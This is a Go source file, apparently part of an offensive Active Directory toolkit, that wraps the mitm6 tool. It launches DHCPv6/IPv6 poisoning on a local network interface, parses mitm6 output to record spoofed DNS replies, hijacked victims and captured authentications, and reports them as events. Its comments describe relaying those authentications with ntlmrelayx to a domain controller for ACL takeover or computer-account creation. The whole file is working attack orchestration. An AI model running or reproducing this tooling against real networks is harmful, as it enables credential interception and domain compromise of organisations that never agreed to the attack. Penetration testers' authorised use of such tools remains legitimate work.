// Package runtime: mitm6 IPv6 poisoning service.
//
// mitm6 (https://github.com/dirkjanm/mitm6) performs SLAAC + DHCPv6
// poisoning on IPv4-only Windows networks: it answers DHCPv6 solicits
// on the local link with a controlled DNS server, causing Windows to
// resolve internal names through us. Paired with ntlmrelayx -6, this
// triggers authentications that get relayed (canonically to LDAPS on
// the DC for ACL takeover or computer-account creation).
//
// CLI reference: mitm6 -i <iface> -d <domain> [--ignore-nofqdn] [--no-ra]
//
// Output indicators we surface as service events:
//   - "Sent spoofed reply"        → EvSessionCaptured (poisoning landed)
//   - "IPv6 address ... assigned"  → EvSessionCaptured (victim now uses our DNS)
//   - "got authentication"         → EvHashCaptured (when running with -A)
package runtime

import (
	"bufio"
	"context"
	"os/exec"
	"regexp"
	"strings"
	"sync"
	"time"

	"adpack/core"
)

// mitm6 stdout patterns. mitm6 is verbose so we match the most useful lines.
var (
	mitm6SpoofRe  = regexp.MustCompile(`(?i)Sent spoofed reply for (\S+) to ([0-9a-f:.]+)`)
	mitm6AssignRe = regexp.MustCompile(`(?i)IPv6 address ([0-9a-f:]+) is now assigned to (\S+)`)
	mitm6AuthRe   = regexp.MustCompile(`(?i)got authentication.*for\s+([A-Za-z0-9._\\-]+)`)
)

// Mitm6Config mirrors core.Mitm6Config for the runtime-internal layer.
// Kept separate so internal/ doesn't import core types except via the
// supervisor adapter.
type Mitm6Config struct {
	Interface     string
	Domain        string
	HostAllowList []string
	HostDenyList  []string
	IgnoreNoFQDN  bool
	NoRA          bool
	RelayTarget   string
	Verbose       bool
}

// DefaultMitm6Config returns the minimum viable configuration for the
// canonical (mitm6 + ntlmrelayx -6 → LDAPS) flow.
func DefaultMitm6Config(iface, domain string) Mitm6Config {
	return Mitm6Config{
		Interface:    iface,
		Domain:       domain,
		IgnoreNoFQDN: true, // avoid noisy clients without FQDN in DHCPv6
		Verbose:      true,
	}
}

// buildMitm6Args converts Mitm6Config to the mitm6 CLI args.
func buildMitm6Args(cfg Mitm6Config) []string {
	var args []string
	if cfg.Interface != "" {
		args = append(args, "-i", cfg.Interface)
	}
	if cfg.Domain != "" {
		args = append(args, "-d", cfg.Domain)
	}
	for _, h := range cfg.HostAllowList {
		args = append(args, "--host-allowlist", h)
	}
	for _, h := range cfg.HostDenyList {
		args = append(args, "--host-denylist", h)
	}
	if cfg.IgnoreNoFQDN {
		args = append(args, "--ignore-nofqdn")
	}
	if cfg.NoRA {
		args = append(args, "--no-ra")
	}
	if cfg.Verbose {
		args = append(args, "-v")
	}
	return args
}

// startMitm6 launches the mitm6 subprocess and returns a channel of stdout
// lines plus a stop closure. mitm6 is a single long-running process (unlike
// coercer's loop) so we follow the responder.go shape, not coercer.go's.
func startMitm6(ctx context.Context, cfg Mitm6Config) (*exec.Cmd, <-chan string, func() error, error) {
	args := buildMitm6Args(cfg)
	cmd := exec.CommandContext(ctx, "mitm6", args...)

	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return nil, nil, nil, err
	}
	// mitm6 also writes to stderr; merge so operators see DHCPv6 lifecycle.
	cmd.Stderr = cmd.Stdout

	if err := cmd.Start(); err != nil {
		return nil, nil, nil, err
	}

	lines := make(chan string, 64)
	var wg sync.WaitGroup
	wg.Add(1)
	go func() {
		defer wg.Done()
		defer close(lines)
		scanner := bufio.NewScanner(stdout)
		for scanner.Scan() {
			lines <- scanner.Text()
		}
	}()

	stop := func() error {
		if cmd.Process != nil {
			return cmd.Process.Kill()
		}
		return nil
	}

	go func() {
		cmd.Wait()
		wg.Wait()
	}()

	return cmd, lines, stop, nil
}

// parseMitm6Line classifies a mitm6 stdout line and returns the strongest
// signal it carries. Returns ("","",false) for lines we don't act on.
func parseMitm6Line(line string) (kind, subject, value string, ok bool) {
	if m := mitm6AuthRe.FindStringSubmatch(line); len(m) >= 2 {
		return "auth", m[1], "", true
	}
	if m := mitm6AssignRe.FindStringSubmatch(line); len(m) >= 3 {
		return "assign", m[2], m[1], true // subject=client, value=ipv6
	}
	if m := mitm6SpoofRe.FindStringSubmatch(line); len(m) >= 3 {
		return "spoof", m[1], m[2], true // subject=fqdn, value=client_ipv6
	}
	return "", "", "", false
}

// NewMitm6Service creates a ManagedService backed by mitm6.
func NewMitm6Service(id, label string, cfg Mitm6Config) *core.ManagedService {
	return &core.ManagedService{
		ID:    id,
		Type:  core.ServiceMitm6,
		Label: label,
		State: core.ServiceStopped,
		Config: map[string]any{
			"interface":     cfg.Interface,
			"domain":        cfg.Domain,
			"relay_target":  cfg.RelayTarget,
			"_spoof_count":  0,
			"_assign_count": 0,
			"_auth_count":   0,
		},
		ValidUntil: time.Now().Add(4 * time.Hour),
		Events:     make(chan core.ServiceEvent, 64),
	}
}

// StartMitm6Service runs the registered mitm6 service to completion,
// emitting ServiceEvents to svc.Events for each significant stdout line.
func StartMitm6Service(svc *core.ManagedService, cfg Mitm6Config, parentCtx context.Context) error {
	ctx, cancel := context.WithCancel(parentCtx)

	cmd, lines, stop, err := startMitm6(ctx, cfg)
	if err != nil {
		cancel()
		return err
	}

	svc.Config["_cmd"] = cmd
	svc.Config["_cancel"] = cancel
	svc.StopFn = func() error {
		cancel()
		return stop()
	}
	svc.State = core.ServiceRunning
	svc.LastHeartbeat = time.Now()

	go func() {
		for line := range lines {
			kind, subject, value, ok := parseMitm6Line(line)
			if !ok {
				continue
			}
			switch kind {
			case "auth":
				svc.Events <- core.ServiceEvent{
					Type:      core.EvHashCaptured,
					ServiceID: svc.ID,
					Service:   core.ServiceMitm6,
					Timestamp: time.Now(),
					Data: map[string]any{
						"source_user":    subject,
						"raw":            line,
						"capture_method": "mitm6_dhcpv6",
					},
				}
				incInt(svc.Config, "_auth_count")
			case "assign":
				svc.Events <- core.ServiceEvent{
					Type:      core.EvSessionCaptured,
					ServiceID: svc.ID,
					Service:   core.ServiceMitm6,
					Timestamp: time.Now(),
					Data: map[string]any{
						"client":         strings.TrimSuffix(subject, "."),
						"ipv6":           value,
						"raw":            line,
						"capture_method": "mitm6_assign",
					},
				}
				incInt(svc.Config, "_assign_count")
			case "spoof":
				svc.Events <- core.ServiceEvent{
					Type:      core.EvSessionCaptured,
					ServiceID: svc.ID,
					Service:   core.ServiceMitm6,
					Timestamp: time.Now(),
					Data: map[string]any{
						"fqdn":           subject,
						"client_ipv6":    value,
						"raw":            line,
						"capture_method": "mitm6_spoof",
					},
				}
				incInt(svc.Config, "_spoof_count")
			}
		}
		svc.State = core.ServiceStopped
	}()

	return nil
}

// incInt atomically-ish increments an int counter stored in a map[string]any.
// (The supervisor holds the mu lock during config reads/writes; this helper
// is only called from the service's own goroutine, which is single-writer.)
func incInt(m map[string]any, key string) {
	if m == nil {
		return
	}
	switch v := m[key].(type) {
	case int:
		m[key] = v + 1
	case int64:
		m[key] = v + 1
	default:
		m[key] = 1
	}
}
